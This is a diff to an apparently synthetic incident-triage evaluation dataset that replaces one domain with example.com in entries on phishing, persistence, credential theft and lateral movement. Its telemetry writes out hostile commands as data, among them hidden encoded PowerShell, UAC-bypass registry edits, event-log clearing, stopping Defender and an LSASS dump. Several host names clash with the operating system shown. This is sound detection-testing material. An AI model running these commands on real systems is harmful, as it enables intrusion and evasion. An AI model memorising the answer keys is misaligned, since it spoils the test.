@@ -3,8 +3,8 @@
     "id": "INC-EVAL-001",
     "template_id": "phishing-macro-email",
     "template_index": 0,
-    "title": "Spear-phishing email with macro-laden attachment delivered to dave@aisoc.dev",
-    "description": "Inbound email from 45.142.122.111 delivered an Office document with a malicious VBA macro to dave@aisoc.dev. Attachment opened on WIN-DC-PRIMARY; macro spawned cmd.exe and downloaded a stage-2 payload from a known Lazarus infrastructure.",
+    "title": "Spear-phishing email with macro-laden attachment delivered to dave@example.com",
+    "description": "Inbound email from 45.142.122.111 delivered an Office document with a malicious VBA macro to dave@example.com. Attachment opened on WIN-DC-PRIMARY; macro spawned cmd.exe and downloaded a stage-2 payload from a known Lazarus infrastructure.",
     "expected_tactics": [
       "TA0001",
       "TA0002"
@@ -20,7 +20,7 @@
       "macro",
       "45.142.122.111",
       "WIN-DC-PRIMARY",
-      "dave@aisoc.dev",
+      "dave@example.com",
       "stage-2 payload"
     ],
     "telemetry": [
@@ -28,7 +28,7 @@
         "source": "m365_audit",
         "Workload": "Exchange",
         "Operation": "Send",
-        "UserId": "dave@aisoc.dev",
+        "UserId": "dave@example.com",
         "ClientIP": "45.142.122.111",
         "Subject": "Q4 invoice (action required)",
         "AttachmentNames": [
@@ -41,7 +41,7 @@
         "Provider": "Microsoft-Windows-Sysmon",
         "EventID": 1,
         "Computer": "WIN-DC-PRIMARY",
-        "User": "dave@aisoc.dev",
+        "User": "dave@example.com",
         "Image": "C:\\Windows\\System32\\cmd.exe",
         "ParentImage": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
         "CommandLine": "cmd.exe /c powershell -nop -w hidden -enc <stage2>"
@@ -51,7 +51,7 @@
         "rule": "Office macro spawned cmd.exe",
         "severity": "high",
         "Computer": "WIN-DC-PRIMARY",
-        "User": "dave@aisoc.dev",
+        "User": "dave@example.com",
         "threat_actor": "Lazarus"
       }
     ]
@@ -107,7 +107,7 @@
     "template_id": "confluence-watering-hole",
     "template_index": 2,
     "title": "Watering-hole exploit served from internal Confluence by 203.0.113.45",
-    "description": "Internal Confluence page injected with malicious JavaScript by 203.0.113.45. Drive-by exploit triggered browser exploitation on multiple visitors including ops-lead@aisoc.dev. Linked to Lazarus TTPs.",
+    "description": "Internal Confluence page injected with malicious JavaScript by 203.0.113.45. Drive-by exploit triggered browser exploitation on multiple visitors including ops-lead@example.com. Linked to Lazarus TTPs.",
     "expected_tactics": [
       "TA0001",
       "TA0002"
@@ -123,14 +123,14 @@
       "drive-by",
       "Confluence",
       "203.0.113.45",
-      "ops-lead@aisoc.dev",
+      "ops-lead@example.com",
       "Lazarus"
     ],
     "telemetry": [
       {
         "source": "web_access",
         "http_method": "POST",
-        "url": "https://confluence.aisoc.dev/pages/editpage.action?pageId=8472",
+        "url": "https://confluence.example.com/pages/editpage.action?pageId=8472",
         "status_code": 200,
         "src_ip": "203.0.113.45",
         "user_agent": "Mozilla/5.0",
@@ -141,7 +141,7 @@
         "rule": "Browser exploitation: drive-by JavaScript loader",
         "severity": "high",
         "Computer": "WIN-HR-DESKTOP",
-        "User": "ops-lead@aisoc.dev",
+        "User": "ops-lead@example.com",
         "threat_actor": "Lazarus"
       }
     ]
@@ -206,7 +206,7 @@
     "template_id": "usb-autorun-airgap",
     "template_index": 4,
     "title": "Malicious USB autorun on air-gapped host WIN-DEVOPS-LT",
-    "description": "USB device inserted on air-gapped WIN-DEVOPS-LT by cfo@aisoc.dev. AutoRun executed Python stager that collected local files. Data staged in C:\\Temp\\.",
+    "description": "USB device inserted on air-gapped WIN-DEVOPS-LT by cfo@example.com. AutoRun executed Python stager that collected local files. Data staged in C:\\Temp\\.",
     "expected_tactics": [
       "TA0001",
       "TA0009"
@@ -222,7 +222,7 @@
       "autorun",
       "air-gapped",
       "WIN-DEVOPS-LT",
-      "cfo@aisoc.dev",
+      "cfo@example.com",
       "Python stager"
     ],
     "telemetry": [
@@ -232,7 +232,7 @@
         "Provider": "Microsoft-Windows-Security-Auditing",
         "EventID": 6416,
         "Computer": "WIN-DEVOPS-LT",
-        "SubjectUserName": "cfo@aisoc.dev",
+        "SubjectUserName": "cfo@example.com",
         "ClassName": "USB",
         "DeviceDescription": "SanDisk Cruzer 16GB"
       },
@@ -242,7 +242,7 @@
         "Provider": "Microsoft-Windows-Sysmon",
         "EventID": 1,
         "Computer": "WIN-DEVOPS-LT",
-        "User": "cfo@aisoc.dev",
+        "User": "cfo@example.com",
         "Image": "C:\\Python311\\python.exe",
         "ParentImage": "C:\\Windows\\System32\\rundll32.exe",
         "CommandLine": "python.exe E:\\autorun.py --stage C:\\Temp\\"
@@ -253,8 +253,8 @@
     "id": "INC-EVAL-006",
     "template_id": "oauth-consent-phish",
     "template_index": 5,
-    "title": "OAuth consent phishing targeting ceo@aisoc.dev",
-    "description": "Malicious OAuth application granted Mail.Read and Files.Read.All scopes by ceo@aisoc.dev. Inbox forwarding rule created sending mail to 91.134.231.15.",
+    "title": "OAuth consent phishing targeting ceo@example.com",
+    "description": "Malicious OAuth application granted Mail.Read and Files.Read.All scopes by ceo@example.com. Inbox forwarding rule created sending mail to 91.134.231.15.",
     "expected_tactics": [
       "TA0001",
       "TA0006"
@@ -269,7 +269,7 @@
       "OAuth consent",
       "Mail.Read",
       "Files.Read.All",
-      "ceo@aisoc.dev",
+      "ceo@example.com",
       "91.134.231.15",
       "forwarding rule"
     ],
@@ -278,7 +278,7 @@
         "source": "m365_audit",
         "Workload": "AzureActiveDirectory",
         "Operation": "Consent to application.",
-        "UserId": "ceo@aisoc.dev",
+        "UserId": "ceo@example.com",
         "ApplicationId": "00000003-0000-0ff1-ce00-000000000000",
         "ConsentedScopes": [
           "Mail.Read",
@@ -290,7 +290,7 @@
         "source": "m365_audit",
         "Workload": "Exchange",
         "Operation": "New-InboxRule",
-        "UserId": "ceo@aisoc.dev",
+        "UserId": "ceo@example.com",
         "Parameters": {
           "Name": "Auto-fwd",
           "ForwardTo": "ext@91.134.231.15",
@@ -304,7 +304,7 @@
     "template_id": "powershell-obfuscated-dropper",
     "template_index": 6,
     "title": "Obfuscated PowerShell dropper executed on LIN-OBS-LOGGER",
-    "description": "PowerShell dropper executed on LIN-OBS-LOGGER by ceo@aisoc.dev; payload base64-encoded and decoded in-memory. Linked to MagicWeb ransomware staging.",
+    "description": "PowerShell dropper executed on LIN-OBS-LOGGER by ceo@example.com; payload base64-encoded and decoded in-memory. Linked to MagicWeb ransomware staging.",
     "expected_tactics": [
       "TA0002",
       "TA0005"
@@ -320,7 +320,7 @@
       "obfuscated",
       "base64",
       "LIN-OBS-LOGGER",
-      "ceo@aisoc.dev",
+      "ceo@example.com",
       "MagicWeb"
     ],
     "telemetry": [
@@ -330,7 +330,7 @@
         "Provider": "Microsoft-Windows-Sysmon",
         "EventID": 1,
         "Computer": "LIN-OBS-LOGGER",
-        "User": "ceo@aisoc.dev",
+        "User": "ceo@example.com",
         "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
         "ParentImage": "C:\\Windows\\explorer.exe",
         "CommandLine": "powershell.exe -nop -w hidden -enc JABzAD0ATgB..."
@@ -341,7 +341,7 @@
         "Provider": "Microsoft-Windows-Security-Auditing",
         "EventID": 4104,
         "Computer": "LIN-OBS-LOGGER",
-        "User": "ceo@aisoc.dev",
+        "User": "ceo@example.com",
         "ScriptBlockText": "$s=[System.Convert]::FromBase64String(...);[Reflection.Assembly]::Load($s).EntryPoint.Invoke(...)",
         "threat_actor": "MagicWeb"
       }
@@ -453,7 +453,7 @@
     "template_id": "wmi-event-subscription",
     "template_index": 9,
     "title": "Malicious WMI subscription on AZURE-VM-FIN-001",
-    "description": "Permanent WMI event subscription created on AZURE-VM-FIN-001 by admin@aisoc.dev. Consumer runs encoded script. Persistence + execution mechanism.",
+    "description": "Permanent WMI event subscription created on AZURE-VM-FIN-001 by admin@example.com. Consumer runs encoded script. Persistence + execution mechanism.",
     "expected_tactics": [
       "TA0002",
       "TA0003"
@@ -469,7 +469,7 @@
       "subscription",
       "permanent",
       "AZURE-VM-FIN-001",
-      "admin@aisoc.dev",
+      "admin@example.com",
       "encoded script"
     ],
     "telemetry": [
@@ -479,7 +479,7 @@
         "Provider": "Microsoft-Windows-Sysmon",
         "EventID": 19,
         "Computer": "AZURE-VM-FIN-001",
-        "User": "admin@aisoc.dev",
+        "User": "admin@example.com",
         "EventNamespace": "ROOT\\Subscription",
         "Name": "UpdaterFilter",
         "Query": "SELECT * FROM __InstanceModificationEvent WITHIN 60"
@@ -501,7 +501,7 @@
     "id": "INC-EVAL-011",
     "template_id": "registry-run-persistence",
     "template_index": 10,
-    "title": "Registry Run key persistence created by ops-lead@aisoc.dev on AWS-EC2-PROD-API",
+    "title": "Registry Run key persistence created by ops-lead@example.com on AWS-EC2-PROD-API",
     "description": "New value written to HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run on AWS-EC2-PROD-API. Points to roaming binary signed with revoked cert. Linked to Volt Typhoon.",
     "expected_tactics": [
       "TA0003"
@@ -516,7 +516,7 @@
       "persistence",
       "revoked cert",
       "AWS-EC2-PROD-API",
-      "ops-lead@aisoc.dev",
+      "ops-lead@example.com",
       "Volt Typhoon"
     ],
     "telemetry": [
@@ -526,17 +526,17 @@
         "Provider": "Microsoft-Windows-Sysmon",
         "EventID": 13,
         "Computer": "AWS-EC2-PROD-API",
-        "User": "ops-lead@aisoc.dev",
+        "User": "ops-lead@example.com",
         "EventType": "SetValue",
         "TargetObject": "HKU\\S-1-5-21-...\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Updater",
-        "Details": "C:\\Users\\ops-lead@aisoc.dev\\AppData\\Roaming\\updater.exe"
+        "Details": "C:\\Users\\ops-lead@example.com\\AppData\\Roaming\\updater.exe"
       },
       {
         "source": "edr",
         "rule": "Persistence: Registry Run with revoked-cert signed binary",
         "severity": "high",
         "Computer": "AWS-EC2-PROD-API",
-        "User": "ops-lead@aisoc.dev",
+        "User": "ops-lead@example.com",
         "threat_actor": "Volt Typhoon"
       }
     ]
@@ -546,7 +546,7 @@
     "template_id": "scheduled-task-persistence",
     "template_index": 11,
     "title": "Scheduled task persistence on GCP-GKE-NODE-04",
-    "description": "Hidden scheduled task created on GCP-GKE-NODE-04 by carol@aisoc.dev: triggers every 30 minutes, runs script from %APPDATA%\\Roaming. Persistence mechanism.",
+    "description": "Hidden scheduled task created on GCP-GKE-NODE-04 by carol@example.com: triggers every 30 minutes, runs script from %APPDATA%\\Roaming. Persistence mechanism.",
     "expected_tactics": [
       "TA0003"
     ],
@@ -560,7 +560,7 @@
       "persistence",
       "APPDATA",
       "GCP-GKE-NODE-04",
-      "carol@aisoc.dev"
+      "carol@example.com"
     ],
     "telemetry": [
       {
@@ -569,7 +569,7 @@
         "Provider": "Microsoft-Windows-Security-Auditing",
         "EventID": 4698,
         "Computer": "GCP-GKE-NODE-04",
-        "SubjectUserName": "carol@aisoc.dev",
+        "SubjectUserName": "carol@example.com",
         "TaskName": "\\Microsoft\\Windows\\UpdaterTask",
         "TaskContent": "<Hidden>true</Hidden><Exec>%APPDATA%\\Roaming\\u.ps1</Exec>"
       },
@@ -582,7 +582,7 @@
         "Image": "C:\\Windows\\System32\\schtasks.exe",
         "ParentImage": "C:\\Windows\\System32\\cmd.exe",
         "CommandLine": "schtasks /Create /SC MINUTE /MO 30 /TN UpdaterTask /TR \"powershell -f %APPDATA%\\Roaming\\u.ps1\" /F",
-        "User": "carol@aisoc.dev"
+        "User": "carol@example.com"
       }
     ]
   },
@@ -634,7 +634,7 @@
     "template_id": "cron-backdoor",
     "template_index": 13,
     "title": "Backdoor cron job installed on WIN-HR-DESKTOP",
-    "description": "/etc/cron.d entry created by svc-deploy@aisoc.dev on WIN-HR-DESKTOP. Reverse shell beacon to 203.0.113.45 every 5 minutes.",
+    "description": "/etc/cron.d entry created by svc-deploy@example.com on WIN-HR-DESKTOP. Reverse shell beacon to 203.0.113.45 every 5 minutes.",
     "expected_tactics": [
       "TA0003",
       "TA0011"
@@ -650,7 +650,7 @@
       "backdoor",
       "reverse shell",
       "WIN-HR-DESKTOP",
-      "svc-deploy@aisoc.dev",
+      "svc-deploy@example.com",
       "203.0.113.45"
     ],
     "telemetry": [
@@ -661,7 +661,7 @@
         "exe": "/usr/bin/vi",
         "path": "/etc/cron.d/zz-update",
         "hostname": "WIN-HR-DESKTOP",
-        "user": "svc-deploy@aisoc.dev",
+        "user": "svc-deploy@example.com",
         "a2": "O_WRONLY|O_CREAT"
       },
       {
@@ -677,7 +677,7 @@
     "template_id": "uac-bypass-fodhelper",
     "template_index": 14,
     "title": "UAC bypass observed on MAC-LEGAL-LAPTOP",
-    "description": "fodhelper.exe abuse on MAC-LEGAL-LAPTOP by svc-deploy@aisoc.dev; auto-elevation triggered without prompt. Process tree shows escalation to SYSTEM.",
+    "description": "fodhelper.exe abuse on MAC-LEGAL-LAPTOP by svc-deploy@example.com; auto-elevation triggered without prompt. Process tree shows escalation to SYSTEM.",
     "expected_tactics": [
       "TA0004",
       "TA0005"
@@ -692,7 +692,7 @@
       "fodhelper",
       "auto-elevation",
       "MAC-LEGAL-LAPTOP",
-      "svc-deploy@aisoc.dev",
+      "svc-deploy@example.com",
       "SYSTEM"
     ],
     "telemetry": [
@@ -702,7 +702,7 @@
         "Provider": "Microsoft-Windows-Sysmon",
         "EventID": 13,
         "Computer": "MAC-LEGAL-LAPTOP",
-        "User": "svc-deploy@aisoc.dev",
+        "User": "svc-deploy@example.com",
         "EventType": "SetValue",
         "TargetObject": "HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command",
         "Details": "C:\\Windows\\System32\\cmd.exe /c whoami"
@@ -725,7 +725,7 @@
     "template_id": "k8s-privileged-pod-escape",
     "template_index": 15,
     "title": "Container escape via privileged pod on K8S-PROD-CLUSTER",
-    "description": "Kubernetes privileged pod created on K8S-PROD-CLUSTER by eve@aisoc.dev. cgroup escape to host namespace observed. Node filesystem accessed.",
+    "description": "Kubernetes privileged pod created on K8S-PROD-CLUSTER by eve@example.com. cgroup escape to host namespace observed. Node filesystem accessed.",
     "expected_tactics": [
       "TA0004",
       "TA0007"
@@ -742,7 +742,7 @@
       "container escape",
       "cgroup",
       "K8S-PROD-CLUSTER",
-      "eve@aisoc.dev"
+      "eve@example.com"
     ],
     "telemetry": [
       {
@@ -754,7 +754,7 @@
           "resource": "pods"
         },
         "user": {
-          "username": "eve@aisoc.dev"
+          "username": "eve@example.com"
         },
         "requestObject": {
           "spec": {
@@ -792,7 +792,7 @@
     "template_id": "linux-suid-abuse",
     "template_index": 16,
     "title": "Linux SUID binary abuse on LIN-DB-REPLICA",
-    "description": "Custom SUID binary discovered in /tmp on LIN-DB-REPLICA; allows arbitrary command execution as root. Likely escalation by svc-deploy@aisoc.dev.",
+    "description": "Custom SUID binary discovered in /tmp on LIN-DB-REPLICA; allows arbitrary command execution as root. Likely escalation by svc-deploy@example.com.",
     "expected_tactics": [
       "TA0004"
     ],
@@ -806,7 +806,7 @@
       "/tmp",
       "root escalation",
       "LIN-DB-REPLICA",
-      "svc-deploy@aisoc.dev"
+      "svc-deploy@example.com"
     ],
     "telemetry": [
       {
@@ -817,7 +817,7 @@
         "a1": "/tmp/.x",
         "mode": "04755",
         "hostname": "LIN-DB-REPLICA",
-        "user": "svc-deploy@aisoc.dev"
+        "user": "svc-deploy@example.com"
       },
       {
         "source": "linux_auditd",
@@ -827,7 +827,7 @@
         "hostname": "LIN-DB-REPLICA",
         "uid": 1001,
         "euid": 0,
-        "user": "svc-deploy@aisoc.dev"
+        "user": "svc-deploy@example.com"
       }
     ]
   },
@@ -893,7 +893,7 @@
     "template_id": "event-log-cleared",
     "template_index": 18,
     "title": "Indicator removal: Windows event log cleared on LIN-EDGE-VPN02",
-    "description": "Security event log cleared on LIN-EDGE-VPN02 by frank@aisoc.dev. wevtutil.exe cl Security observed in command-line telemetry.",
+    "description": "Security event log cleared on LIN-EDGE-VPN02 by frank@example.com. wevtutil.exe cl Security observed in command-line telemetry.",
     "expected_tactics": [
       "TA0005"
     ],
@@ -907,7 +907,7 @@
       "log cleared",
       "indicator removal",
       "LIN-EDGE-VPN02",
-      "frank@aisoc.dev"
+      "frank@example.com"
     ],
     "telemetry": [
       {
@@ -916,7 +916,7 @@
         "Provider": "Microsoft-Windows-Security-Auditing",
         "EventID": 1102,
         "Computer": "LIN-EDGE-VPN02",
-        "SubjectUserName": "frank@aisoc.dev",
+        "SubjectUserName": "frank@example.com",
         "Channel": "Security",
         "Description": "The audit log was cleared."
       },
@@ -926,7 +926,7 @@
         "Provider": "Microsoft-Windows-Sysmon",
         "EventID": 1,
         "Computer": "LIN-EDGE-VPN02",
-        "User": "frank@aisoc.dev",
+        "User": "frank@example.com",
         "Image": "C:\\Windows\\System32\\wevtutil.exe",
         "CommandLine": "wevtutil cl Security"
       }
@@ -937,7 +937,7 @@
     "template_id": "disable-edr-tooling",
     "template_index": 19,
     "title": "Disable security tooling on GCP-GKE-NODE-04",
-    "description": "eve@aisoc.dev attempted to stop Defender, CrowdStrike, and Sysmon on GCP-GKE-NODE-04. Tampering telemetry triggered alert.",
+    "description": "eve@example.com attempted to stop Defender, CrowdStrike, and Sysmon on GCP-GKE-NODE-04. Tampering telemetry triggered alert.",
     "expected_tactics": [
       "TA0005"
     ],
@@ -952,7 +952,7 @@
       "sysmon",
       "tampering",
       "GCP-GKE-NODE-04",
-      "eve@aisoc.dev"
+      "eve@example.com"
     ],
     "telemetry": [
       {
@@ -961,7 +961,7 @@
         "Provider": "Microsoft-Windows-Sysmon",
         "EventID": 1,
         "Computer": "GCP-GKE-NODE-04",
-        "User": "eve@aisoc.dev",
+        "User": "eve@example.com",
         "Image": "C:\\Windows\\System32\\sc.exe",
         "CommandLine": "sc.exe stop CSAgent"
       },
@@ -971,7 +971,7 @@
         "Provider": "Microsoft-Windows-Sysmon",
         "EventID": 1,
         "Computer": "GCP-GKE-NODE-04",
-        "User": "eve@aisoc.dev",
+        "User": "eve@example.com",
         "Image": "C:\\Windows\\System32\\sc.exe",
         "CommandLine": "sc.exe stop WinDefend"
       },
@@ -980,7 +980,7 @@
         "rule": "EDR tampering attempt",
         "severity": "critical",
         "Computer": "GCP-GKE-NODE-04",
-        "User": "eve@aisoc.dev"
+        "User": "eve@example.com"
       }
     ]
   },
@@ -988,7 +988,7 @@
     "id": "INC-EVAL-021",
     "template_id": "lsass-memory-dump",
     "template_index": 20,
-    "title": "LSASS memory dump on AZURE-VM-FIN-001 by carol@aisoc.dev",
+    "title": "LSASS memory dump on AZURE-VM-FIN-001 by carol@example.com",
     "description": "comsvcs.dll MiniDump observed on AZURE-VM-FIN-001. lsass.exe memory dumped to C:\\Windows\\Temp\\. Mimikatz signatures detected.",
     "expected_tactics": [
       "TA0006"
@@ -1004,7 +1004,7 @@
       "comsvcs",
       "mimikatz",
       "AZURE-VM-FIN-001",
-      "carol@aisoc.dev"
+      "carol@example.com"
     ],
     "telemetry": [
       {
@@ -1017,7 +1017,7 @@
         "TargetImage": "C:\\Windows\\System32\\lsass.exe",
         "GrantedAccess": "0x1010",
         "CallTrace": "comsvcs.dll+5d24|MiniDumpWriteDump",
-        "User": "carol@aisoc.dev"
+        "User": "carol@example.com"
       },
       {
         "source": "sysmon",
@@ -1027,7 +1027,7 @@
         "Computer": "AZURE-VM-FIN-001",
         "Image": "C:\\Windows\\System32\\rundll32.exe",
         "TargetFilename": "C:\\Windows\\Temp\\lsass.dmp",
-        "User": "carol@aisoc.dev"
+        "User": "carol@example.com"
       }
     ]
   },
@@ -1035,8 +1035,8 @@
     "id": "INC-EVAL-022",
     "template_id": "credential-spray",
     "template_index": 21,
-    "title": "Brute-force credential spray against svc-deploy@aisoc.dev from 45.142.122.111",
-    "description": "Credential spray from 45.142.122.111 against svc-deploy@aisoc.dev. 1500 password attempts in 30 minutes. One success followed by anomalous Azure AD sign-in.",
+    "title": "Brute-force credential spray against svc-deploy@example.com from 45.142.122.111",
+    "description": "Credential spray from 45.142.122.111 against svc-deploy@example.com. 1500 password attempts in 30 minutes. One success followed by anomalous Azure AD sign-in.",
     "expected_tactics": [
       "TA0006"
     ],
@@ -1048,7 +1048,7 @@
     "evidence_keywords": [
       "brute force",
       "credential spray",
-      "svc-deploy@aisoc.dev",
+      "svc-deploy@example.com",
       "45.142.122.111",
       "azure ad"
     ],
@@ -1056,7 +1056,7 @@
       {
         "source": "azure_signin",
         "category": "SignInLogs",
-        "userPrincipalName": "svc-deploy@aisoc.dev",
+        "userPrincipalName": "svc-deploy@example.com",
         "ipAddress": "45.142.122.111",
         "resultType": 50126,
         "resultDescription": "Invalid username or password",
@@ -1066,7 +1066,7 @@
       {
         "source": "azure_signin",
         "category": "SignInLogs",
-        "userPrincipalName": "svc-deploy@aisoc.dev",
+        "userPrincipalName": "svc-deploy@example.com",
         "ipAddress": "45.142.122.111",
         "resultType": 0,
         "resultDescription": "Success",
@@ -1080,7 +1080,7 @@
     "template_id": "kerberoasting",
     "template_index": 22,
     "title": "Kerberoasting from MAC-CFO-LAPTOP",
-    "description": "Service account TGS tickets requested en-masse from MAC-CFO-LAPTOP by svc-backup@aisoc.dev. AES256 \u2192 RC4 downgrade observed. Mimikatz tooling indicators.",
+    "description": "Service account TGS tickets requested en-masse from MAC-CFO-LAPTOP by svc-backup@example.com. AES256 \u2192 RC4 downgrade observed. Mimikatz tooling indicators.",
     "expected_tactics": [
       "TA0006",
       "TA0008"
@@ -1097,7 +1097,7 @@
       "RC4",
       "mimikatz",
       "MAC-CFO-LAPTOP",
-      "svc-backup@aisoc.dev"
+      "svc-backup@example.com"
     ],
     "telemetry": [
       {
@@ -1106,8 +1106,8 @@
         "Provider": "Microsoft-Windows-Security-Auditing",
         "EventID": 4769,
         "Computer": "WIN-DC-PRIMARY",
-        "TargetUserName": "svc-backup@aisoc.dev",
-        "ServiceName": "MSSQLSvc/sql.aisoc.dev",
+        "TargetUserName": "svc-backup@example.com",
+        "ServiceName": "MSSQLSvc/sql.example.com",
         "TicketEncryptionType": "0x17",
         "IpAddress": "MAC-CFO-LAPTOP"
       },
@@ -1117,8 +1117,8 @@
         "Provider": "Microsoft-Windows-Security-Auditing",
         "EventID": 4769,
         "Computer": "WIN-DC-PRIMARY",
-        "TargetUserName": "svc-backup@aisoc.dev",
-        "ServiceName": "HTTP/web01.aisoc.dev",
+        "TargetUserName": "svc-backup@example.com",
+        "ServiceName": "HTTP/web01.example.com",
         "TicketEncryptionType": "0x17",
         "IpAddress": "MAC-CFO-LAPTOP"
       }
@@ -1129,7 +1129,7 @@
     "template_id": "ad-dcsync",
     "template_index": 23,
     "title": "Active Directory DCSync from non-DC host AWS-EC2-PROD-API",
-    "description": "Replication rights abused from AWS-EC2-PROD-API by carol@aisoc.dev. All domain NTLM hashes replicated. Severe credential exposure.",
+    "description": "Replication rights abused from AWS-EC2-PROD-API by carol@example.com. All domain NTLM hashes replicated. Severe credential exposure.",
     "expected_tactics": [
       "TA0006",
       "TA0004"
@@ -1145,7 +1145,7 @@
       "replication",
       "ntlm hash",
       "AWS-EC2-PROD-API",
-      "carol@aisoc.dev"
+      "carol@example.com"
     ],
     "telemetry": [
       {
@@ -1154,7 +1154,7 @@
         "Provider": "Microsoft-Windows-Security-Auditing",
         "EventID": 4662,
         "Computer": "WIN-DC-PRIMARY",
-        "SubjectUserName": "carol@aisoc.dev",
+        "SubjectUserName": "carol@example.com",
         "ObjectServer": "DS",
         "ObjectType": "domainDNS",
         "Properties": "1131f6aa-9c07-11d1-f79f-00c04fc2dcd2",
@@ -1166,8 +1166,8 @@
     "id": "INC-EVAL-025",
     "template_id": "saml-golden-ticket",
     "template_index": 24,
-    "title": "SAML golden-ticket: forged assertion targeting ceo@aisoc.dev",
-    "description": "Forged SAML assertion detected for ceo@aisoc.dev. Attacker pivoted to Azure AD; account enumeration followed from 198.51.100.23.",
+    "title": "SAML golden-ticket: forged assertion targeting ceo@example.com",
+    "description": "Forged SAML assertion detected for ceo@example.com. Attacker pivoted to Azure AD; account enumeration followed from 198.51.100.23.",
     "expected_tactics": [
       "TA0006",
       "TA0007"
@@ -1183,14 +1183,14 @@
       "golden ticket",
       "forged",
       "azure ad",
-      "ceo@aisoc.dev",
+      "ceo@example.com",
       "198.51.100.23"
     ],
     "telemetry": [
       {
         "source": "azure_signin",
         "category": "SignInLogs",
-        "userPrincipalName": "ceo@aisoc.dev",
+        "userPrincipalName": "ceo@example.com",
         "ipAddress": "198.51.100.23",
         "resultType": 0,
         "authenticationDetails": [
@@ -1200,13 +1200,13 @@
           }
         ],
         "tokenIssuerType": "ADFederationServices",
-        "tokenIssuerName": "forged-adfs.aisoc.dev"
+        "tokenIssuerName": "forged-adfs.example.com"
       },
       {
         "source": "m365_audit",
         "Workload": "AzureActiveDirectory",
         "Operation": "Add member to role.",
-        "UserId": "ceo@aisoc.dev",
+        "UserId": "ceo@example.com",
         "ModifiedProperties": [
           {
             "Name": "Role.DisplayName",
@@ -1221,7 +1221,7 @@
     "template_id": "ldap-bloodhound-discovery",
     "template_index": 25,
     "title": "Domain enumeration from LIN-K8S-NODE01",
-    "description": "ldap discovery from LIN-K8S-NODE01 by svc-deploy@aisoc.dev: BloodHound-style queries enumerating users, groups, ACLs.",
+    "description": "ldap discovery from LIN-K8S-NODE01 by svc-deploy@example.com: BloodHound-style queries enumerating users, groups, ACLs.",
     "expected_tactics": [
       "TA0007"
     ],
@@ -1235,7 +1235,7 @@
       "bloodhound",
       "domain enumeration",
       "LIN-K8S-NODE01",
-      "svc-deploy@aisoc.dev"
+      "svc-deploy@example.com"
     ],
     "telemetry": [
       {
@@ -1247,7 +1247,7 @@
         "Image": "C:\\Tools\\SharpHound.exe",
         "DestinationIp": "WIN-DC-PRIMARY",
         "DestinationPort": 389,
-        "User": "svc-deploy@aisoc.dev"
+        "User": "svc-deploy@example.com"
       },
       {
         "source": "windows_security",
@@ -1255,7 +1255,7 @@
         "Provider": "Microsoft-Windows-Security-Auditing",
         "EventID": 4662,
         "Computer": "WIN-DC-PRIMARY",
-        "SubjectUserName": "svc-deploy@aisoc.dev",
+        "SubjectUserName": "svc-deploy@example.com",
         "ObjectType": "user",
         "AccessMask": "0x100",
         "EventCount": 8400
@@ -1267,7 +1267,7 @@
     "template_id": "smb-share-enumeration",
     "template_index": 26,
     "title": "Network share enumeration on LIN-EDGE-VPN02",
-    "description": "Mass SMB share enumeration from LIN-EDGE-VPN02 by svc-deploy@aisoc.dev; net.exe and PowerShell Get-SmbShare invocations across /24 subnet.",
+    "description": "Mass SMB share enumeration from LIN-EDGE-VPN02 by svc-deploy@example.com; net.exe and PowerShell Get-SmbShare invocations across /24 subnet.",
     "expected_tactics": [
       "TA0007"
     ],
@@ -1282,7 +1282,7 @@
       "Get-SmbShare",
       "share enumeration",
       "LIN-EDGE-VPN02",
-      "svc-deploy@aisoc.dev"
+      "svc-deploy@example.com"
     ],
     "telemetry": [
       {
@@ -1291,7 +1291,7 @@
         "Provider": "Microsoft-Windows-Sysmon",
         "EventID": 1,
         "Computer": "LIN-EDGE-VPN02",
-        "User": "svc-deploy@aisoc.dev",
+        "User": "svc-deploy@example.com",
         "Image": "C:\\Windows\\System32\\net.exe",
         "CommandLine": "net.exe view /domain"
       },
@@ -1301,7 +1301,7 @@
         "Provider": "Microsoft-Windows-Security-Auditing",
         "EventID": 5145,
         "Computer": "WIN-FILE-SHARE",
-        "SubjectUserName": "svc-deploy@aisoc.dev",
+        "SubjectUserName": "svc-deploy@example.com",
         "ShareName": "\\\\*\\*",
         "IpAddress": "LIN-EDGE-VPN02",
         "EventCount": 256
@@ -1313,7 +1313,7 @@
     "template_id": "pass-the-hash-lateral",
     "template_index": 27,
     "title": "Pass-the-hash from AZURE-VM-FIN-001 to LIN-EDGE-VPN02",
-    "description": "Pass-the-hash lateral movement from AZURE-VM-FIN-001 to LIN-EDGE-VPN02 by ceo@aisoc.dev. Golden ticket indicators present. Linked to APT28.",
+    "description": "Pass-the-hash lateral movement from AZURE-VM-FIN-001 to LIN-EDGE-VPN02 by ceo@example.com. Golden ticket indicators present. Linked to APT28.",
     "expected_tactics": [
       "TA0008",
       "TA0006"
@@ -1329,7 +1329,7 @@
       "golden ticket",
       "AZURE-VM-FIN-001",
       "LIN-EDGE-VPN02",
-      "ceo@aisoc.dev",
+      "ceo@example.com",
       "APT28"
     ],
     "telemetry": [
@@ -1339,7 +1339,7 @@
         "Provider": "Microsoft-Windows-Security-Auditing",
         "EventID": 4624,
         "Computer": "LIN-EDGE-VPN02",
-        "TargetUserName": "ceo@aisoc.dev",
+        "TargetUserName": "ceo@example.com",
         "LogonType": 3,
         "AuthenticationPackageName": "NTLM",
         "IpAddress": "AZURE-VM-FIN-001",
@@ -1351,7 +1351,7 @@
         "severity": "high",
         "Computer": "LIN-EDGE-VPN02",
         "Source": "AZURE-VM-FIN-001",
-        "User": "ceo@aisoc.dev",
+        "User": "ceo@example.com",
         "threat_actor": "APT28"
       }
     ]
@@ -1361,7 +1361,7 @@
     "template_id": "rdp-lateral-movement",
     "template_index": 28,
     "title": "RDP lateral movement from LIN-BUILD-CI03",
-    "description": "Anomalous RDP session from LIN-BUILD-CI03 (ops-lead@aisoc.dev) to AZURE-VM-FIN-001 outside business hours. Source admin not normal for AZURE-VM-FIN-001.",
+    "description": "Anomalous RDP session from LIN-BUILD-CI03 (ops-lead@example.com) to AZURE-VM-FIN-001 outside business hours. Source admin not normal for AZURE-VM-FIN-001.",
     "expected_tactics": [
       "TA0008"
     ],
@@ -1376,7 +1376,7 @@
       "outside hours",
       "LIN-BUILD-CI03",
       "AZURE-VM-FIN-001",
-      "ops-lead@aisoc.dev"
+      "ops-lead@example.com"
     ],
